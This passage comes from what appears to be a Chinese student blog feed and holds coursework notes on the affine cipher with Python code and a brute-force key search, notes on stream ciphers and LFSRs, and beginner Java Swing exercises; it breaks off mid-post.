class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#仿射加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fangshe</span><span class="params">(p,k1,k2)</span>:</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">temp=chr((((ord(p[i])-ord(<span class="string">'a'</span>))*k1+k2)%<span class="number">26</span>)+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=temp</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"><span class="comment">#判断最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="keyword">if</span> x&gt;y:</span><br><span class="line">temp=y</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=x</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,temp+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span>((x%i==<span class="number">0</span>) <span class="keyword">and</span> (y%i==<span class="number">0</span>)):</span><br><span class="line">s=i</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"><span class="comment">#仿射解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a,b,str1)</span>:</span></span><br><span class="line">c1=<span class="string">""</span></span><br><span class="line"><span class="keyword">if</span>(gcd(a,<span class="number">26</span>)==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line"><span class="keyword">if</span>((a*i)%<span class="number">26</span>==<span class="number">1</span>):</span><br><span class="line">k1_re=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">temp=chr((((ord(str1[i])-ord(<span class="string">'a'</span>))-b)*k1_re)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c1+=temp</span><br><span class="line"><span class="keyword">return</span> c1</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" EncryptInput "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">p=raw_input(<span class="string">"Please enter the plain:"</span>)</span><br><span class="line">k1=input(<span class="string">"Please enter k1:"</span>)</span><br><span class="line">k2=input(<span class="string">"Please enter k2:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Encryption "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">c=fangshe(p,k1,k2)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Cipher:"</span>+c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" DecryptInput "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">C=raw_input(<span class="string">"Please enter the Cipher:"</span>)</span><br><span class="line">key1=input(<span class="string">"Please enter k1:"</span>)</span><br><span class="line">key2=input(<span class="string">"Please enter k2:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Decryption "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">plain=decode(key1,key2,C)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Plain:"</span>+plain</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性"><a href="#运行结果及正确性" class="headerlink" title="运行结果及正确性"></a>运行结果及正确性</h2><p>输入明文hellocumt，k1=7,k2=2加密所得的密文用仿射解密得出原来的明文，所以正确性得到验证</p><p><img src="https://s2.ax1x.com/2019/01/02/FIEyNt.png" alt="结果"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>1.仿射密码对于任意两个不同的字母，其最后得到的密文肯定不一样；所以当密文长度足够长时，我们可以使用频率分析的方法来解决。利用仿射密码时，一般只有 26 个字母，而不大于 26 的与 26 互素的个数一共有12个，算上偏移量，也就是大概12x26=312种可能性。</p><p>一般来说，对于该种密码，至少得是在已知部分明文的情况下才可以攻击。下面进行简单的分析。</p><p>已知部分明密文对：<code>y1=(ax1+b)mod26</code>     <code>y2=(ax2+b)(mod26)</code>   </p><p>两式相减：<code>y1−y2=a(x1−x2)(mod26)</code>很容易得到a，得到了a即可解出b</p><p>2.对密文直接用312个密钥空间进行暴破，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">plain=<span class="string">"zebbwqmif"</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line">k=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">res=chr((ord(plain[x])-ord(<span class="string">'a'</span>)-j)*k[i]%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=res</span><br><span class="line"><span class="keyword">print</span> c<span class="comment">#+'\n'</span></span><br><span class="line"><span class="keyword">if</span> c==<span class="string">"hellocumt"</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"find it"</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br></pre></td></tr></table></figure><p>运行结果：找到有意义的密文</p><p><img src="https://s2.ax1x.com/2019/01/13/FvvqPA.png" alt="FvvqPA.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;终于放假了，整理一波之前密码学的报告和笔记
    
    </summary>
    
      <category term="密码学学习" scheme="https://gardenia30.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>序列密码学习笔记</title>
    <link href="https://gardenia30.top/2019/01/01/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/01/01/序列密码笔记/</id>
    <published>2019-01-01T09:10:17.000Z</published>
    <updated>2019-04-09T09:24:52.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2019年的第一天，继续加油鸭！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="序列密码简单叙述"><a href="#序列密码简单叙述" class="headerlink" title="序列密码简单叙述"></a>序列密码简单叙述</h2><p>序列密码属于对称加密；它的加密用一个随机序列(密钥流)与明文序列按位加密产生密文，用同一随机序列与密文序列叠加来恢复明文序列密码为对称加密，一次只对明文消息的单个bit进行加密解密；一般密钥流的长度等于需要加密的密文的长度</p><p><a href="https://imgchr.com/i/F4zDhj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F4zDhj.md.png" alt="F4zDhj.md.png"></a></p><p><strong>特点：</strong></p><ol><li>加解密运算只是简单的模二加（异或）运算</li><li>密码强度主要靠密钥流的随机性</li></ol><h2 id="序列密码加密解密过程"><a href="#序列密码加密解密过程" class="headerlink" title="序列密码加密解密过程"></a>序列密码加密解密过程</h2><p>1.密钥流产生于种子密钥，种子密钥K通过密钥流发生器产生密钥流<code>k=k0k1k2k3...kn-1</code></p><p>2.明文序列为<code>M=m0m1m2m3...m(n-1)</code></p><p>3.接下来就是K与M逐位异或得到C的序列<img src="https://s1.ax1x.com/2018/12/24/F6IdrF.png" alt="img"></p><p>4.解密不必多说，只要异或回去就好<img src="https://s1.ax1x.com/2018/12/24/F6Ifqe.png" alt="img"></p><p><strong>具体实现的流程图：</strong></p><p><img src="https://s1.ax1x.com/2018/12/24/F6IIIA.png" alt="img"></p><h2 id="序列密码的分类"><a href="#序列密码的分类" class="headerlink" title="序列密码的分类"></a>序列密码的分类</h2><h3 id="1-同步序列密码"><a href="#1-同步序列密码" class="headerlink" title="1.同步序列密码"></a>1.同步序列密码</h3><p>所谓同步序列密码指的是：密钥序列的产生独立于明文消息和密文消息；</p><p><strong>加密过程如下:</strong></p><p><img src="https://s1.ax1x.com/2018/12/24/F6TD91.png" alt="img"></p><p><code>f是状态函数，和密钥源产生必要得状态参数，g是产生密钥序列ki的函数，E是将ki与mi结合输出ci的函数</code></p><p><strong>模型：</strong></p><p><img src="https://s2.ax1x.com/2019/01/01/F4zC0U.png" alt="F4zC0U.png"><img src="https://s2.ax1x.com/2019/01/01/F4zP7F.png" alt="F4zP7F.png"></p><p><strong>特点：</strong></p><p>1.无错误传播：各符号之间真正独立。一个传播错误只影响一个符号，不会影响到后继的符号</p><p>2.同步：发送方和接收方必须保持精确的、用同样的密钥并作用在同样的位置上，才能正确的解密</p><h3 id="2-自同步序列密码"><a href="#2-自同步序列密码" class="headerlink" title="2.自同步序列密码"></a>2.自同步序列密码</h3><p>发双方中的任何一方，其密钥流的产生依赖于密文流；</p><p><strong>加密过程：</strong></p><p><a href="https://imgchr.com/i/F4zunK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F4zunK.md.png" alt="F4zunK.md.png"></a></p><p><strong>模型：</strong></p><p><img src="https://s2.ax1x.com/2019/01/01/F4zM7D.png" alt="加密.png"><img src="https://s2.ax1x.com/2019/01/01/F4zlAe.png" alt="解密.png"></p><p><strong>特点：</strong></p><p>1.有限错误传播：设密钥序列产生器具有n位存储，则一个符号的传输错误只影响到后面n符号的解密</p><p>2.自同步：只要接收方连续收到n个正确的密文符号，密钥序列产生器便会自动地恢复同步 </p><p>3.消除明文统计特性</p><h2 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>1.可以产生具有良好伪随机性的序列如：m序列，所以在序列密码中作为密钥序列的驱动序列</p><p>2.一个线性反馈移位寄存器由两部分组成：<strong>移位寄存器+反馈函数</strong></p><h3 id="游程"><a href="#游程" class="headerlink" title="游程"></a>游程</h3><p>游程就是指连续的1或0序列，游程长度是指连续的1或0序列的长度；</p><h3 id="移位寄存器"><a href="#移位寄存器" class="headerlink" title="移位寄存器"></a>移位寄存器</h3><p>移位寄存器是指有n个寄存器（称为n级移位寄存器）<code>r1,r2,…,rn</code>从右到左排列，每个寄存器中能存放1位二进制数，所有寄存器中的数可以统一向右（或向左）移动1位，称为进动1拍。即<code>r1</code>的值<code>(b1)</code>右移1位后输出，然后<code>r2</code>的值<code>(b2)</code>送<code>r1</code> ,<code>r3</code>的值<code>(b3)</code>送<code>r2</code>,……最后，<code>rn</code>的值<code>(bn)</code>送<code>rn-1</code></p><p><img src="https://s2.ax1x.com/2019/01/01/F5FfMj.png" alt="F5FfMj.png"></p><h3 id="反馈移位寄存器-FSR"><a href="#反馈移位寄存器-FSR" class="headerlink" title="反馈移位寄存器(FSR)"></a>反馈移位寄存器(FSR)</h3><p>反馈移位寄存器(feedback shift register,FSR)是由n位的寄存器和反馈函数(feedback function)组成，n位的寄存器中的初始值称为移位寄存器的初态</p><p><img src="https://s2.ax1x.com/2019/01/01/F5F4Ln.png" alt="F5F4Ln.png"></p><h3 id="线性反馈移位寄存器（LFSR）"><a href="#线性反馈移位寄存器（LFSR）" class="headerlink" title="线性反馈移位寄存器（LFSR）"></a>线性反馈移位寄存器（LFSR）</h3><p>LFSR是一种特殊的FSR，其反馈函数是移位寄存器中某些位的异或，参与运算的这些位叫做<strong><em>抽头位</em></strong>；</p><p><strong>特征：</strong></p><p>1.n级LFSR的有效状态为<code>(2^n)-1</code>（全0状态除外，因全0状态的输出序列一直为全0），也即理论上能够产生周期为<code>(2^n)-1</code>的伪随机序列。但要产生最大周期的输出序列，抽头位有一定要求;</p><p>2.为了使LFSR得到最大的周期(2^n)-1，其生成多项式（由抽头序列加上常数1形成的多项式）要是本原多项式，这样生成的序列叫做m序列</p><p><strong>本原多项式：</strong></p><p><a href="https://imgchr.com/i/F5AoCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F5AoCT.md.png" alt="F5AoCT.md.png"></a><br><strong>加解密：</strong></p><p>一个LFSR可以生成足够长的密钥二进制序列加密明文二进制序列，要解密密文，只需要运行具有相同初始状态的LFSR即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2019年的第一天，继续加油鸭！
    
    </summary>
    
      <category term="密码学学习" scheme="https://gardenia30.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Java图形界面与多线程</title>
    <link href="https://gardenia30.top/2018/12/31/Java%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>https://gardenia30.top/2018/12/31/Java图形界面与多线程/</id>
    <published>2018-12-31T12:28:51.000Z</published>
    <updated>2018-12-31T14:06:18.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Java上课都没认真听过，菜的一批……<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="加减乘除四则运算器"><a href="#加减乘除四则运算器" class="headerlink" title="加减乘除四则运算器"></a>加减乘除四则运算器</h2><p><strong>要求：</strong></p><p><img src="https://s1.ax1x.com/2018/12/31/F4BAu4.png" alt="F4BAu4.png"></p><p><strong>分析：</strong></p><p>1.创建类calculator继承JFrame；</p><p>2.在创建的calculator中添加所需要的各个组件：JButton，JTextfield；</p><p>3.在构造方法中对上述组件进行初始化然后进行添加，并且设置布局为流式布局，设置标题，框体参数；并且添加4个事件监听器；</p><p>4.具体用接口的方法实现4个事件监听器；</p><p>5.在主函数中new一个对象，调用setvisible()；</p><p>注意点：就是设计除法功能的时候需要注意一下输入输出都是double类型的数据</p><p><strong>源码如下：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> homework3;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.FlowLayout;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">calculator</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">JTextField shu1;</span><br><span class="line">JTextField shu2;</span><br><span class="line">JTextField shu3;</span><br><span class="line">JButton jia;</span><br><span class="line">JButton sub;</span><br><span class="line">JButton mul;</span><br><span class="line">JButton div;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">calculator</span><span class="params">()</span></span>&#123;</span><br><span class="line">setLayout(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">shu1=<span class="keyword">new</span> JTextField(<span class="number">20</span>);</span><br><span class="line">shu2=<span class="keyword">new</span> JTextField(<span class="number">20</span>);</span><br><span class="line">jia=<span class="keyword">new</span> JButton(<span class="string">"+"</span>);</span><br><span class="line">sub=<span class="keyword">new</span> JButton(<span class="string">"-"</span>);</span><br><span class="line">mul=<span class="keyword">new</span> JButton(<span class="string">"*"</span>);</span><br><span class="line">div=<span class="keyword">new</span> JButton(<span class="string">"/"</span>);</span><br><span class="line">shu3=<span class="keyword">new</span> JTextField(<span class="number">20</span>);</span><br><span class="line">add(shu1);</span><br><span class="line">add(shu2);</span><br><span class="line">add(jia);</span><br><span class="line">add(sub);</span><br><span class="line">add(mul);</span><br><span class="line">add(div);</span><br><span class="line">add(shu3);</span><br><span class="line">setSize(<span class="number">280</span>,<span class="number">160</span>);</span><br><span class="line">setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line">setTitle(<span class="string">"My calculator"</span>);</span><br><span class="line">jia.addActionListener(<span class="keyword">new</span> Myactionlistener1());</span><br><span class="line">sub.addActionListener(<span class="keyword">new</span> Myactionlistener2());</span><br><span class="line">mul.addActionListener(<span class="keyword">new</span> Myactionlistener3());</span><br><span class="line">div.addActionListener(<span class="keyword">new</span> Myactionlistener4());</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener1</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">int</span> x=Integer.parseInt(shu1.getText());</span><br><span class="line"><span class="keyword">int</span> y=Integer.parseInt(shu2.getText());</span><br><span class="line"><span class="keyword">int</span> z=x+y;</span><br><span class="line">shu3.setText(Integer.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener2</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">int</span> x=Integer.parseInt(shu1.getText());</span><br><span class="line"><span class="keyword">int</span> y=Integer.parseInt(shu2.getText());</span><br><span class="line"><span class="keyword">int</span> z=x-y;</span><br><span class="line">shu3.setText(Integer.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener3</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">int</span> x=Integer.parseInt(shu1.getText());</span><br><span class="line"><span class="keyword">int</span> y=Integer.parseInt(shu2.getText());</span><br><span class="line"><span class="keyword">int</span> z=x*y;</span><br><span class="line">shu3.setText(Integer.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener4</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">double</span> x=Double.parseDouble(shu1.getText());</span><br><span class="line"><span class="keyword">double</span> y=Double.parseDouble(shu2.getText());</span><br><span class="line"><span class="keyword">double</span> z=x/y;</span><br><span class="line">shu3.setText(Double.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">calculator c=<span class="keyword">new</span> calculator();</span><br><span class="line">c.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：分别为加减乘除的效果</p><p><img src="https://s1.ax1x.com/2018/12/31/F4BLPx.png" alt="F4BLPx.png"><img src="https://s1.ax1x.com/2018/12/31/F4DARf.png" alt="F4DARf.png"><img src="https://s1.ax1x.com/2018/12/31/F4DZQS.png" alt="F4DZQS.png"><img src="https://s1.ax1x.com/2018/12/31/F4r0BQ.png" alt="F4r0BQ.png"></p><h2 id="笑脸切换哭脸"><a href="#笑脸切换哭脸" class="headerlink" title="笑脸切换哭脸"></a>笑脸切换哭脸</h2><p><strong>要求：</strong>点击框体笑脸切换哭脸，再次点击哭脸转换为笑脸，依次循环；</p><p><strong>分析：</strong>首先需要实现画出的基础画面，drawOval实现画出脸型；fillOval实现画出眼睛；drawArc画出部分圆弧作为嘴巴；</p><p>这里的难点就是如何依次切换，在这里我设置了一个参数a=1，paint方法中，每次都会对a进行判断，如果是奇数就画出笑脸，如果是偶数就会画出哭脸，画出之后会实现a++，也就保证了下次都会向与一次不同的脸转换；</p><p><strong>源码如下：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> homework3;</span><br><span class="line"><span class="keyword">import</span> java.awt.Color;</span><br><span class="line"><span class="keyword">import</span> java.awt.Graphics;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">smile</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.paint(g);</span><br><span class="line">    g.setColor(Color.black);</span><br><span class="line">    g.drawOval(<span class="number">50</span>, <span class="number">50</span>, <span class="number">80</span>, <span class="number">100</span>);</span><br><span class="line">    g.fillOval(<span class="number">70</span>, <span class="number">80</span>, <span class="number">14</span>, <span class="number">7</span>);</span><br><span class="line">    g.fillOval(<span class="number">110</span>, <span class="number">80</span>, <span class="number">14</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>(a%<span class="number">2</span>==<span class="number">1</span>) &#123;</span><br><span class="line">    g.drawArc(<span class="number">70</span>, <span class="number">110</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    g.drawArc(<span class="number">70</span>, <span class="number">110</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">strartframe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setTitle(<span class="string">"smile and cry"</span>);</span><br><span class="line">    <span class="keyword">this</span>.setSize(<span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">        <span class="keyword">this</span>.setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">repaint();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">    smile s=<span class="keyword">new</span> smile();</span><br><span class="line">    s.strartframe();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong>如下为第一次运行与点击一次窗体后的结果</p><p><img src="https://s1.ax1x.com/2018/12/31/F4DsSK.png" alt="F4DsSK.png"><img src="https://s1.ax1x.com/2018/12/31/F4DyQO.png" alt="F4DyQO.png"></p><h2 id="标签移动"><a href="#标签移动" class="headerlink" 